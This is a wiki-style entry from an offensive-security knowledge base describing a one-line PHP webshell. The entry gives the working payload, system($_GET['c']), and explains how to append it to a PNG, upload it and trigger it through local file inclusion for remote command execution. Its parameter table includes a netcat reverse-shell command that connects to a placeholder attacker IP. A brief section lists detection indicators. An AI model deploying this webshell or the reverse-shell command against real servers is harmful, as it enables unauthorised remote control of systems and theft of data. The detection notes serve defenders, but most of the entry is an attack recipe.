---
id: e94b8082-9e62-4433-9fc0-a3c9afba67c6
name: PHP-Webshell-System-Command
type: code
language: PHP
verified: true
created_at: '2023-04-06T03:55:58.480857+00:00'
updated_at: '2023-04-10T20:22:14.564532+00:00'
platforms:
  - Linux
  - Web
tags:
  - webshell
  - rce
  - lfi
validated: true
---

# PHP-Webshell-System-Command

## Code

```php
<?php system($_GET['c']); ?>
```

## Description

This simple PHP webshell payload executes arbitrary system commands passed via the 'c' query parameter (e.g., ?c=whoami). It is embedded in uploaded files (e.g., images) for LFI exploitation, allowing RCE when the file is included and accessed.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET['c'] | Query parameter for the command to execute | whoami, ls -la, nc -e /bin/sh attacker_ip 4444 |

## Usage

Embed this code at the end of a legitimate file (e.g., PNG) using a hex editor to avoid breaking the file format. Upload via the application's endpoint, then include via LFI (e.g., ?page=uploads/file.png) and trigger with ?c=command. Ideal for initial shell access in PHP environments.

## Detection

- Web server logs showing requests with 'c=' parameter or path traversal.
- File integrity checks on uploads revealing PHP code in non-PHP files.
- Process monitoring for unexpected command executions (e.g., via auditd).
- WAF rules blocking system() calls or suspicious query params.

## Related

- [[procedures/Exploit-LFI-to-RCE-via-Malicious-File-Upload]]
- [[curl-access-lfi-with-parameter]]
